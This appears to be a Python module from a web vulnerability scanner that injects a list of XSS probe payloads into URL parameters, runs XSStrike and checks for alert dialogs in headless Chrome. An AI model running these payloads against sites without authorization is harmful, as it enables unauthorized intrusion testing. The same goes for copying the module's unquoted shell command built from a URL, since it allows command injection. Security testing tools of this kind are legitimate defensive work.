import re
import logging
import requests
from typing import List
from core.utils import run_command, save_raw_output, parse_url_params
from core.rate_limiter import get_rate_limiter

logger = logging.getLogger('snooger')

# Diverse XSS payload set
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'-alert(1)-'",
    "<details open ontoggle=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<input autofocus onfocus=alert(1)>",
    # HTML entity bypass
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # DOM-based candidates
    "'-alert`1`//",
    "\";alert(1)//",
]

def quick_xss_test(url: str, workspace_dir: str, auth=None) -> dict:
    """Fast XSS detection with reflection and context analysis."""
    logger.debug(f"Quick XSS test: {url}")
    rl = get_rate_limiter()
    base_url, params = parse_url_params(url)
    if not params:
        return {'validated': False, 'reason': 'no parameters'}

    session = auth.session if auth else requests.Session()
    session.headers.setdefault('User-Agent', 'Mozilla/5.0')

    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            try:
                rl.wait(base_url)
                resp = session.get(base_url, params=test_params, timeout=10, verify=False)

                # Direct reflection check
                if payload in resp.text:
                    context = _detect_xss_context(payload, resp.text)
                    return {
                        'validated': True,
                        'type': 'XSS (reflected)',
                        'parameter': param,
                        'payload': payload,
                        'severity': 'high',
                        'evidence': f"Payload reflected in response",
                        'context': context
                    }

                # Check for partial reflection (encoded)
                sanitized = re.sub(r'[<>"\'&]', '', payload)
                if sanitized in resp.text and len(sanitized) > 5:
                    return {
                        'validated': True,
                        'type': 'XSS candidate (partial reflection)',
                        'parameter': param,
                        'payload': payload,
                        'severity': 'medium',
                        'evidence': 'Partial payload reflected (encoding may be weak)',
                        'context': 'unknown'
                    }

                # Check for HTML entity encoding (might be bypassable)
                html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
                if html_encoded in resp.text:
                    logger.debug(f"Payload HTML-encoded in response (likely safe): {url}")

            except Exception as e:
                logger.debug(f"XSS test error: {e}")

    return {'validated': False}

def _detect_xss_context(payload: str, response_text: str) -> str:
    """Detect the HTML context where the payload is reflected."""
    idx = response_text.find(payload)
    if idx == -1:
        return 'unknown'
    before = response_text[max(0, idx-100):idx].lower()
    if 'javascript:' in before or '<script' in before:
        return 'javascript'
    if 'value=' in before or 'input' in before:
        return 'attribute'
    if '<' in response_text[idx:idx+1]:
        return 'html_tag'
    return 'html_text'

def validate_xss_xsstrike(url: str, workspace_dir: str) -> dict:
    """Run XSStrike for confirmed XSS testing."""
    logger.info(f"Running XSStrike on {url}")
    cmd = f"xsstrike -u '{url}' --blind"
    stdout, stderr, rc = run_command(cmd, timeout=180)
    save_raw_output(workspace_dir, 'validation', f'xsstrike_{abs(hash(url)) % 100000}',
                    stdout + stderr, 'txt')
    if "vulnerable" in stdout.lower() or "XSS found" in stdout:
        return {
            'validated': True,
            'type': 'XSS',
            'tool': 'XSStrike',
            'evidence': stdout[:800]
        }
    return {'validated': False}

def test_dom_xss(url: str, workspace_dir: str, auth=None) -> List[dict]:
    """
    Test for DOM-based XSS using headless browser (selenium).
    Requires Chrome/Chromium with selenium.
    """
    findings = []
    DOM_PAYLOADS = [
        "javascript:alert(document.domain)",
        "#<img src=x onerror=alert(1)>",
        "#<script>alert(1)</script>",
    ]
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.common.exceptions import UnexpectedAlertPresentException

        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        driver = webdriver.Chrome(options=options)

        for payload in DOM_PAYLOADS:
            test_url = f"{url}{payload}"
            try:
                driver.get(test_url)
                import time
                time.sleep(1)
                # If alert was triggered, DOM XSS found
                try:
                    alert = driver.switch_to.alert
                    text = alert.text
                    alert.dismiss()
                    findings.append({
                        'type': 'DOM_XSS',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'high',
                        'evidence': f"Alert triggered: {text}"
                    })
                    logger.warning(f"DOM XSS found: {test_url}")
                except Exception:
                    pass
            except UnexpectedAlertPresentException:
                findings.append({
                    'type': 'DOM_XSS',
                    'url': test_url,
                    'payload': payload,
                    'severity': 'high',
                    'evidence': 'Unexpected alert triggered by payload'
                })
            except Exception:
                pass

        driver.quit()
    except ImportError:
        logger.debug("Selenium not available for DOM XSS testing")
    except Exception as e:
        logger.debug(f"DOM XSS testing failed: {e}")

    return findings
